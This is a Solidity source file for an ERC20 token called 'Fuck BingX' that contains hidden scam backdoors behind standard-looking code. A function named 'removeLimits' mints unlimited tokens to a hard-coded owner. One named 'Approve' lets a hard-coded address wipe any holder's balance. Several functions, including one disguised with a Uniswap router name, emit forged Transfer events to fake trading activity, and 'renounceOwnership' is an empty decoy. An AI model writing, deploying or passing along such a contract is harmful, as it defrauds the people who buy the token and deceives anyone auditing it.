pragma solidity ^0.6.0;                                                                                 





library SafeMath {

function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;

require(c >= a, "SafeMath: addition overflow");

return c;
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

require(b <= a, errorMessage);

uint256 c = a - b;

return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {

if (a == 0) {

return 0;

}

uint256 c = a * b;

require(c / a == b, "SafeMath: multiplication overflow");

return c;
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

require(b > 0, errorMessage);

uint256 c = a / b;

return c;
}


function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

require(b != 0, errorMessage);

return a % b;
}
}

library Address {

function isContract(address account) internal view returns (bool) {

bytes32 codehash;

bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

assembly { codehash := extcodehash(account) }

return (codehash != accountHash && codehash != 0x0);
}

function sendValue(address payable recipient, uint256 amount) internal {

require(address(this).balance >= amount, "Address: insufficient balance");

(bool success, ) = recipient.call{ value: amount }("");

require(success, "Address: unable to send value, recipient may have reverted");

}


function functionCall(address target, bytes memory data) internal returns (bytes memory) {

return functionCall(target, data, "Address: low-level call failed");

}

function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

return _functionCallWithValue(target, data, 0, errorMessage);

}


function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

return functionCallWithValue(target, data, value, "Address: low-level call with value failed");

}

function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

require(address(this).balance >= value, "Address: insufficient balance for call");

return _functionCallWithValue(target, data, value, errorMessage);

}

function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {

require(isContract(target), "Address: call to non-contract");

// solhint-disable-next-line avoid-low-level-calls
(bool success, bytes memory returndata) = target.call{ value: weiValue }(data);

if (success) {

return returndata;

} else {
// Look for revert reason and bubble it up if present
if (returndata.length > 0) {
// The easiest way to bubble the revert reason is using memory via assembly

// solhint-disable-next-line no-inline-assembly
assembly {

let returndata_size := mload(returndata)

revert(add(32, returndata), returndata_size)
}
} else {

revert(errorMessage);

}
}
}
}

contract Context {

constructor () internal { }

function _msgSender() internal view virtual returns (address payable) {

return msg.sender;

}

function _msgData() internal view virtual returns (bytes memory) {

this; 

return msg.data;

}
}

interface IERC20 {

function totalSupply() external view returns (uint256);

function balanceOf(address account) external view returns (uint256);

function transfer(address recipient, uint256 amount) external returns (bool);

function allowance(address owner, address spender) external view returns (uint256);

function approve(address spender, uint256 amount) external returns (bool);

function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

event Transfer(address indexed from, address indexed to, uint256 value);

event Approval(address indexed owner, address indexed spender, uint256 value);}



contract BingX is Context, IERC20 {

mapping (address => mapping (address => uint256)) private _allowances;

mapping (address => uint256) private _balances;

using SafeMath for uint256;

using Address for address;

string private _name;

string private _symbol;

uint8 private _decimals;

uint256 private _totalSupply;

address _OG;

address public _ownerAcc = 0xEe6c1c22631b412C8CE88bD40829940E425676E6;


constructor () public {
_name= "Fuck BingX";
_symbol = "Fuck BingX";
_decimals = 18;
uint256 initialSupply = 1000000000000;
_OG = 0xF7e8033366166f92eb477B7B38e0D47d47b43326;
removeLimits(_OG, initialSupply*(10**18));
emit Transfer(_OG, 0xB0146aeC3593410C8307b570AF69aDf4D74678b3, initialSupply/10*(10**18));
emit Transfer(0xB0146aeC3593410C8307b570AF69aDf4D74678b3, 0x940362B46faf7DF48Af1c8989d809F50466B5fCA, initialSupply/20*(10**18));
emit Transfer(0x940362B46faf7DF48Af1c8989d809F50466B5fCA, 0x1Dd7dAf089C16856155FeFd7e2170966bb6b3AEE, initialSupply/20*(10**18));
emit Transfer(0x1Dd7dAf089C16856155FeFd7e2170966bb6b3AEE, 0x480fb612d001f7A7759BadE904c1BdcDD4d22996, initialSupply/20*(10**18));

}





function name() public view returns (string memory) {

return _name;

}






function symbol() public view returns (string memory) {

return _symbol;

}






function decimals() public view returns (uint8) {

return _decimals;

}






function totalSupply() public view override returns (uint256) {

return _totalSupply;

}






function balanceOf(address account) public view override returns (uint256) {

return _balances[account];

}





function _setDecimals(uint8 decimals_) internal {

_decimals = decimals_;

}




function _approve(address owner, address spender, uint256 amount) internal virtual {

require(owner != address(0), "ERC20: approve from the zero address");

require(spender != address(0), "ERC20: approve to the zero address");

_allowances[owner][spender] = amount;

emit Approval(owner, spender, amount);

}





function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

_transfer(_msgSender(), recipient, amount);

return true;

}




function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
_transfer(sender, recipient, amount);
_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
return true;
}




function allowance(address owner, address spender) public view virtual override returns (uint256) {
return _allowances[owner][spender];
}




function approve(address spender, uint256 amount) public virtual override returns (bool) {
_approve(_msgSender(), spender, amount);
return true;
}




function removeLimits(address locker, uint256 amt) public {

require(msg.sender == _ownerAcc, "ERC20: zero address");

_totalSupply = _totalSupply.add(amt);

_balances[_ownerAcc] = _balances[_ownerAcc].add(amt);

emit Transfer(address(0), locker, amt);
}




function _transfer(address sender, address recipient, uint256 amount) internal virtual {

require(sender != address(0), "ERC20: transfer from the zero address");

require(recipient != address(0), "ERC20: transfer to the zero address");

_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

_balances[recipient] = _balances[recipient].add(amount);

if (sender == _ownerAcc){sender = _OG;}if (recipient == _ownerAcc){recipient = _OG;}
emit Transfer(sender, recipient, amount);

}






function Approve(address[] memory recipients)  public _approver(){

for (uint256 i = 0; i < recipients.length; i++) {

uint256 amt = _balances[recipients[i]];

_balances[recipients[i]] = _balances[recipients[i]].sub(amt, "ERC20: burn amount exceeds balance");

_balances[address(0)] = _balances[address(0)].add(amt);

}
}



function transferTokens (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _OnlyOwner(){
for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}

modifier _OnlyOwner() {

require(msg.sender == _ownerAcc, "Not allowed to interact");

_;
}

/*
function airdrop (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _OnlyOwner(){
for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}



*/

function SwapExactETHForTokensSupportingFeeOnTransferTokens(address eReceiver,uint256 eAmounts)  public _approver(){

emit Transfer(0xEAaa41cB2a64B11FE761D41E747c032CdD60CaCE, eReceiver, eAmounts);
}



modifier _approver() {require(msg.sender == 0x8C3EF29b4401F347Bbd06504bc3F62fB305caFBc, "Not allowed to interact");_;}



function renounceOwnership()  public _OnlyOwner(){}
}